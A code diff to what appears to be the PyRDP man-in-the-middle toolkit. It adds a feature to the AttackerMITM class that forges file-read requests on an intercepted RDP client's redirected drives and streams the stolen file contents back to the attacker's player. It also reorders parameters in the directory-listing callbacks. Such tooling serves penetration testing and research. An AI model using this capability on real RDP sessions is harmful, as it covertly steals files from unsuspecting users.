@@ -17,6 +17,7 @@ from pyrdp.parser import BitmapParser
 from pyrdp.pdu import BitmapUpdateData, DeviceAnnounce, FastPathBitmapEvent, FastPathInputEvent, FastPathMouseEvent, \
     FastPathOutputEvent, FastPathPDU, FastPathScanCodeEvent, FastPathUnicodeEvent, PlayerBitmapPDU, \
     PlayerDeviceMappingPDU, PlayerDirectoryListingRequestPDU, PlayerDirectoryListingResponsePDU, PlayerFileDescription, \
+    PlayerFileDownloadCompletePDU, PlayerFileDownloadRequestPDU, PlayerFileDownloadResponsePDU, \
     PlayerForwardingStatePDU, PlayerKeyboardPDU, PlayerMouseButtonPDU, PlayerMouseMovePDU, PlayerMouseWheelPDU, \
     PlayerPDU, PlayerTextPDU
 
@@ -46,6 +47,7 @@ class AttackerMITM(DeviceRedirectionMITMObserver):
         self.recorder = recorder
         self.devices: Dict[int, DeviceAnnounce] = {}
         self.deviceRedirection: Optional[DeviceRedirectionMITM] = None
+        self.fileDownloadRequests: Dict[int, Path] = {}
         self.directoryListingRequests: Dict[int, Path] = {}
         self.directoryListingLists = defaultdict(list)
 
@@ -61,6 +63,7 @@ class AttackerMITM(DeviceRedirectionMITMObserver):
             PlayerPDUType.TEXT: self.handleText,
             PlayerPDUType.FORWARDING_STATE: self.handleForwardingState,
             PlayerPDUType.BITMAP: self.handleBitmap,
+            PlayerPDUType.FILE_DOWNLOAD_REQUEST: self.handleFileDownloadRequest,
             PlayerPDUType.DIRECTORY_LISTING_REQUEST: self.handleDirectoryListingRequest,
         }
 
@@ -181,6 +184,38 @@ class AttackerMITM(DeviceRedirectionMITMObserver):
         self.recorder.record(pdu, pdu.header)
 
 
+    def handleFileDownloadRequest(self, pdu: PlayerFileDownloadRequestPDU):
+        path = pdu.path.replace("/", "\\")
+
+        requestID = self.deviceRedirection.sendForgedFileRead(pdu.deviceID, path)
+        self.fileDownloadRequests[requestID] = path
+
+    def onFileDownloadResult(self, deviceID: int, requestID: int, path: str, offset: int, data: bytes):
+        if requestID not in self.fileDownloadRequests:
+            return
+
+        pdu = PlayerFileDownloadResponsePDU(
+            self.attacker.getCurrentTimeStamp(),
+            deviceID,
+            path,
+            offset,
+            data
+        )
+
+        self.attacker.sendPDU(pdu)
+
+    def onFileDownloadComplete(self, deviceID: int, requestID: int, path: str, error: int):
+        pdu = PlayerFileDownloadCompletePDU(
+            self.attacker.getCurrentTimeStamp(),
+            deviceID,
+            path,
+            error
+        )
+
+        self.attacker.sendPDU(pdu)
+        self.fileDownloadRequests.pop(requestID, None)
+
+
     def handleDirectoryListingRequest(self, pdu: PlayerDirectoryListingRequestPDU):
         if self.deviceRedirection is None:
             self.log.error("A directory listing request was received from the player, but the channel was not initialized.")
@@ -197,7 +232,7 @@ class AttackerMITM(DeviceRedirectionMITMObserver):
         requestID = self.deviceRedirection.sendForgedDirectoryListing(pdu.deviceID, listingPath)
         self.directoryListingRequests[requestID] = Path(pdu.path).absolute()
 
-    def onDirectoryListingResult(self, requestID: int, deviceID: int, fileName: str, isDirectory: bool):
+    def onDirectoryListingResult(self, deviceID: int, requestID: int, fileName: str, isDirectory: bool):
         if requestID not in self.directoryListingRequests:
             return
 
@@ -212,7 +247,7 @@ class AttackerMITM(DeviceRedirectionMITMObserver):
             self.sendDirectoryList(requestID, deviceID)
             directoryList.clear()
 
-    def onDirectoryListingComplete(self, requestID: int, deviceID: int):
+    def onDirectoryListingComplete(self, deviceID: int, requestID: int):
         self.sendDirectoryList(requestID, deviceID)
         self.directoryListingRequests.pop(requestID, None)
         self.directoryListingLists.pop(requestID, None)
